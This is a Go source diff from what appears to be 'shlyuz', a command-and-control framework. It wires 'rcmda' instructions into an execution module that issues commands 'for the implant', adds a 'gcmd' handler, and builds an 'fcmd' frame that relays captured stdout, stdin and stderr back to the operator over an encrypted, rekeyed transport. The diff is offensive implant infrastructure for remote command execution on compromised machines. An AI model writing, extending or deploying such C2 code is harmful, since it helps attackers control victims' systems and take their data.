@@ -8,9 +8,12 @@ import (
 	"shlyuz/pkg/component"
 	routine "shlyuz/pkg/crypto"
 	"shlyuz/pkg/crypto/asymmetric"
+	"shlyuz/pkg/execution"
 	"shlyuz/pkg/instructions"
 	"shlyuz/pkg/transport"
 	"shlyuz/pkg/utils/idgen"
+
+	"golang.org/x/exp/slices"
 )
 
 type initFrameArgs struct {
@@ -71,11 +74,14 @@ func rekey(frame routine.EncryptedFrame) {
 }
 
 func RouteInstruction(server *transport.RegisteredComponent, instruction instructions.InstructionFrame) {
-	var generatedInstruction instructions.InstructionFrame
-
 	switch cmd := instruction.Cmd; cmd {
-	case "rcmda":
-		log.Println(generatedInstruction) // TODO: Do something with this requested command
+	case "rcmda": // issues a new command for the implant
+		log.Println(instruction)                // TODO: Do something with this requested command
+		execution.RouteCmd(server, instruction) // we've now registered the command in the channel, we'll pop it off the server ComponentExecutionChannels when done
+	case "gcmd": // issues a request to get a specific command
+		log.Println(instruction)
+		generatedInstructionFrame := GenerateCmdOutputRelayInstruction(server, instruction.TxId)
+		server = RelayInstructionFrame(server, generatedInstructionFrame)
 	}
 }
 
@@ -94,9 +100,9 @@ func GenerateInitFrame(component component.Component) instructions.InstructionFr
 func RelayInitFrame(shlyuzComponent *component.Component, initFrame instructions.InstructionFrame, shlyuzTransport transport.TransportMethod) *component.Component {
 	frameMap, _ := json.Marshal(initFrame)
 	transmitFrame, _ := routine.PrepareSealedFrame(frameMap, shlyuzComponent.InitalRemotePubkey, shlyuzComponent.Config.CryptoConfig.XorKey, shlyuzComponent.Config.InitSignature)
-	shlyuzComponent.TmpChannel = make(chan []byte)
-	go writeToChannel(shlyuzComponent.TmpChannel, transmitFrame)
-	boolSuccess, err := shlyuzTransport.Send(shlyuzComponent.TmpChannel)
+	shlyuzComponent.TransportChannel = make(chan []byte)
+	go writeToChannel(shlyuzComponent.TransportChannel, transmitFrame)
+	boolSuccess, err := shlyuzTransport.Send(shlyuzComponent.TransportChannel)
 	if !boolSuccess {
 		log.Fatalln("failed to send init: ", err)
 	}
@@ -177,4 +183,22 @@ func RetrieveInstruction(server *transport.RegisteredComponent) (instructions.In
 	instruction = decodeTransactionFrame(instructionData)
 
 	return instruction, nil
+}
+
+func GenerateCmdOutputRelayInstruction(server *transport.RegisteredComponent, cmdId string) instructions.InstructionFrame {
+	var instruction instructions.InstructionFrame
+	var err error
+	instruction.Cmd = "fcmd"
+	instruction.ComponentId = server.SelfComponentId
+	instruction.TxId = cmdId
+	// TODO: Remove slice from array (https://stackoverflow.com/a/37335777) (order isn't important, so we can do this quickly.)
+	idx := slices.IndexFunc(server.ComponentExecutionChannels, func(c *component.ComponentExecutionChannel) bool { return c.CmdId == cmdId })
+	command := server.ComponentExecutionChannels[idx]
+	parsedOutputs := []byte(`{"StdOut": "` + <-command.StdOut + `", "StdIn": "` + <-command.StdIn + `", "StdErr": "` + <-command.StdErr + `"}`)
+	jsonOutputs, err := json.Marshal(parsedOutputs)
+	if err != nil {
+		log.Println("failed to marshal outputs")
+	}
+	instruction.CmdArgs = string(jsonOutputs)
+	return instruction
 }
